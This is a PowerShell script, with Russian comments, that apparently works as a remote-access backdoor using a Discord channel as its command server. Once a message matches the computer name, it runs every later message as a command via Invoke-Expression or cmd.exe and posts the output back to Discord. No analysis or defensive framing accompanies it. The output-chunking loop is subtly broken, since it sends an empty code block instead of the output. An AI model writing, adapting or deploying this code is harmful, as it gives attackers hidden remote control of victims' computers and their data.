$token = "$tk"
$chan  = "$ch"
$response = $null
$previouscmd = $null
$authenticated = 0

function PullMsg {
    try {
        $wc = [System.Net.WebClient]::new()
        $wc.Headers.Add('Authorization', "Bot $token")
        $json = $wc.DownloadString("https://discord.com/api/v9/channels/$chan/messages?limit=5")
        $msg = ($json | ConvertFrom-Json | Where-Object {!$_.author.bot} | Select-Object -First 1).content
        if ($msg) { $script:response = $msg.Trim() }
    } catch {}
}

function sendMsg {
    param([string]$Message)
    if (!$Message) { return }
    # Убираем внутренние тройные кавычки, чтобы Discord всё съел нормально
    $Message = $Message -replace '`', "'"
    $uri = "https://discord.com/api/v9/channels/$chan/messages"
    $payload = @{
        "content" = $Message
        "username" = "$env:COMPUTERNAME"
    }
    try {
        Invoke-RestMethod -Uri $uri -Method Post -Headers @{Authorization="Bot $token"} -ContentType "application/json" -Body ($payload | ConvertTo-Json -Compress)
    } catch {
        Write-Warning "Failed to send: $_"
    }
}

Function Authenticate{
    if ($response -like "$env:COMPUTERNAME") {
        $script:authenticated = 1
        $script:previouscmd = $response
        sendMsg ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
        sendMsg "``PS | $($PWD.Path)>``"
    } else {
        $script:authenticated = 0
        $script:previouscmd = $response
    } 
}

# ===================== MAIN =====================
PullMsg
$previouscmd = $response
sendMsg ":hourglass_flowing_sand: **$env:COMPUTERNAME** | ``Session Waiting..`` :hourglass_flowing_sand:"

while ($true) {
    PullMsg
    if ($response -and $response -ne $previouscmd) {
        $previouscmd = $response
        $dir = $PWD.Path

        if ($authenticated -eq 1) {
            if ($response -eq "close") {
                sendMsg ":octagonal_sign: Session Closed."
                break
            }
            if ($response -eq "Pause") {
                $authenticated = 0
                sendMsg ":pause_button: Session Paused."
                continue
            }

            # Выполнение команды
            $out = ""
            try {
                $out = Invoke-Expression $response 2>&1 | Out-String
            } catch {
                $out = "$_"
            }
            # Если вывод пустой — пробуем через cmd.exe (например, для "ipconfig", "ping")
            if ([string]::IsNullOrWhiteSpace($out)) {
                try {
                    $out = cmd.exe /c $response 2>&1 | Out-String
                } catch {
                    $out = "$_"
                }
            }
            $text = $out.Trim()
            if (!$text) {
                sendMsg ":white_check_mark: ``Command Sent`` :white_check_mark:"
            } else {
                $maxBatchSize = 1900
                while($text.Length -gt 0) {
                    $chunk = $text.Substring(0, [Math]::Min($maxBatchSize, $text.Length))
                    sendMsg "``````"
                    $text = $text.Substring([Math]::Min($maxBatchSize, $text.Length))
                    Start-Sleep -Milliseconds 500
                }
            }
            sendMsg "``PS | $dir>``"
        } else {
            Authenticate
        }
    }
    Start-Sleep -Seconds 5
}

